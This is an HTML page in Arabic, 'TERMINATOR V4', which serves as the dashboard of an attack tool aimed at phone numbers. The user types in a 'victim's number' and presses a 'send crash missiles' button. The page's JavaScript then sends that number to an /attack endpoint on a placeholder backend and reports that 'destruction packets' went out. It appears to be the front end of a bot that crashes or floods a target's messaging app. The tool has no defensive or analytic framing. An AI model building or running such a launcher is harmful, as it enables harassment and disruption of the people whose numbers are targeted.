<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TERMINATOR DASHBOARD</title>
    <style>
        body { background: #0f0f0f; color: #e0e0e0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1a1a1a; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 90%; max-width: 400px; border: 1px solid #333; }
        h1 { color: #ff3e3e; font-size: 24px; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin-bottom: 20px; border-radius: 8px; border: 1px solid #444; background: #252525; color: white; box-sizing: border-box; }
        button { width: 100%; padding: 15px; background: linear-gradient(45deg, #ff0000, #800000); color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover { transform: scale(1.02); box-shadow: 0 0 15px #ff0000; }
        #log { margin-top: 15px; font-size: 14px; color: #888; }
    </style>
</head>
<body>
    <div class="card">
        <h1>💀 TERMINATOR V4</h1>
        <p>التحكم عن بعد: 212718849067</p>
        <input type="text" id="target" placeholder="رقم الضحية (بدون +)">
        <button onclick="launch()">إرسال صواريخ الكراش 🚀</button>
        <div id="log">جاهز لتنفيذ الأوامر...</div>
    </div>

    <script>
        async function launch() {
            const num = document.getElementById('target').value;
            const log = document.getElementById('log');
            if(!num) return alert("أدخل الرقم أولاً!");
            
            log.innerText = "⚡ جاري الاتصال بالسيرفر...";
            try {
                // هنا نضع رابط السيرفر الذي يشغل البوت (مثل Render)
                const response = await fetch(`https://YOUR-BACKEND-URL.com/attack?number=${num}`);
                if(response.ok) {
                    log.style.color = "#00ff00";
                    log.innerText = "✅ تم إرسال حزم التدمير بنجاح!";
                } else {
                    throw new Error();
                }
            } catch (e) {
                log.style.color = "#ff3e3e";
                log.innerText = "❌ فشل الاتصال بالسيرفر!";
            }
        }
    </script>
</body>
</html>
